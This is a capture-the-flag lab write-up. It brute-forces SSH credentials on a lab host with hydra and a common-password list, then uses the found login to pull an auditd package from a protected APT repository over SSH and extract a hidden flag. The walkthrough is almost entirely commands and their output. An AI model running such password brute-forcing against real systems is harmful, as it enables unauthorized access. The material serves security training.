# apt-repo-over-ssh

## Objective:  Figure out the credentials for APT server, get the package and retrieve the flag!

- A flag is hidden in "auditd" package which is hosted on a protected APT repository on the same network.

----

```sh
root@attackdefense:~# nmap -sV 192.48.216.3
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-12 11:59 UTC
Nmap scan report for h4j95rnvqxkzgrbh6nyd5leem.temp-network_a-48-216 (192.48.216.3)
Host is up (0.000027s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:30:D8:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ssh 192.48.216.3
The authenticity of host '192.48.216.3 (192.48.216.3)' can't be established.
ECDSA key fingerprint is SHA256:iPlSD8MVu3bMJgvps4a0pJSwH4knjck/Q+/J+fLAB70.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.48.216.3' (ECDSA) to the list of known hosts.
root@192.48.216.3's password: 
Permission denied, please try again.
root@192.48.216.3's password: 

root@attackdefense:~#
```

```sh
root@attackdefense:~# hydra -l admin -P wordlists/100-common-passwords.txt -f 192.48.216.3 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-12 12:01:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking ssh://192.48.216.3:22/
[22][ssh] host: 192.48.216.3   login: admin   password: panther
[STATUS] attack finished for 192.48.216.3 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-12 12:02:01
root@attackdefense:~# 
```

```sh
root@attackdefense:~# ssh admin@192.48.216.3
admin@192.48.216.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
admin@victim-1:~$ ls -l
total 4
drwxr-xr-x 3 admin root 4096 Jun  9  2019 repo
admin@victim-1:~$ cd repo/
admin@victim-1:~/repo$ ls -l
total 56
-rw-r--r-- 1 admin root  1956 Jun  9  2019 InRelease
-rw-r--r-- 1 admin root  2460 Jun  9  2019 KEY.gpg
-rw-r--r-- 1 admin root 24341 Jun  9  2019 Packages
-rw-r--r-- 1 admin root  9206 Jun  9  2019 Packages.gz
-rw-r--r-- 1 admin root  1204 Jun  9  2019 Release
-rw-r--r-- 1 admin root   703 Jun  9  2019 Release.gpg
drwxr-xr-x 2 admin root  4096 Jun  9  2019 amd64
admin@victim-1:~/repo$ pwd
/home/admin/repo
admin@victim-1:~/repo$ exit
logout
Connection to 192.48.216.3 closed.
root@attackdefense:~# 
``` 

```sh
root@attackdefense:~# echo "deb ssh://admin@192.48.216.3:/home/admin/repo/ /" > /etc/apt/sources.list.d/internal.list
```

```sh
root@attackdefense:~# scp admin@192.48.216.3:/home/admin/repo/KEY.gpg .
admin@192.48.216.3's password: 
KEY.gpg                                                     100% 2460     6.8MB/s   00:00    
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cat KEY.gpg | apt-key add -
OK
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt update
0% [Connecting to 192.48.216.3]s password: 
Get:1 ssh://192.48.216.3/home/admin/repo  InRelease [1956 B]
Get:2 ssh://192.48.216.3/home/admin/repo  Packages [9206 B]
Fetched 11.2 kB in 10s (1083 B/s)
Reading package lists... Done
Building dependency tree       
Reading state information... Done
3 packages can be upgraded. Run 'apt list --upgradable' to see them.
root@attackdefense:~# 
```

```sh
root@attackdefense:~# apt clean 
```

```sh
root@attackdefense:~# apt install -d auditd
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libargon2-0 libdns-export1100
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  libauparse0
Suggested packages:
  audispd-plugins
The following NEW packages will be installed:
  auditd libauparse0
0 upgraded, 2 newly installed, 0 to remove and 3 not upgraded.
Need to get 242 kB of archives.
After this operation, 803 kB of additional disk space will be used.
Do you want to continue? [Y/n] 
0% [Connecting to 192.48.216.3]s password: 
0% [Connecting to 192.48.216.3]
Get:1 ssh://192.48.216.3/home/admin/repo  libauparse0 1:2.8.2-1ubuntu1 [48.6 kB]
Get:2 ssh://192.48.216.3/home/admin/repo  auditd 1:2.8.2-1ubuntu1 [194 kB]
Fetched 242 kB in 13s (18.8 kB/s)
Download complete and in download only mode
root@attackdefense:~# 
```

```sh
root@attackdefense:~# cd /var/cache/apt/archives/
root@attackdefense:/var/cache/apt/archives# ls -l
total 244
-rw-r--r-- 1 root root 193772 Jun  9  2019 auditd_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r--r-- 1 root root  48608 Jun  9  2019 libauparse0_1%3a2.8.2-1ubuntu1_amd64.deb
-rw-r----- 1 root root      0 Jan 10  2018 lock
drwx------ 1 _apt root   4096 Jun 12 12:12 partial
root@attackdefense:/var/cache/apt/archives# 
```

```sh
root@attackdefense:/var/cache/apt/archives# mkdir extracted
```

```sh
root@attackdefense:/var/cache/apt/archives# dpkg-deb -R auditd_1%3a2.8.2-1ubuntu1_amd64.deb extracted/
```

```sh
root@attackdefense:/var/cache/apt/archives# cd extracted/
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# find . -name "*flag*"
./usr/share/flag.txt
root@attackdefense:/var/cache/apt/archives/extracted# 
```

```sh
root@attackdefense:/var/cache/apt/archives/extracted# cat ./usr/share/flag.txt 
d41d8cd98f00b204e9800998ecf8427e
root@attackdefense:/var/cache/apt/archives/extracted# 
```

----

EOF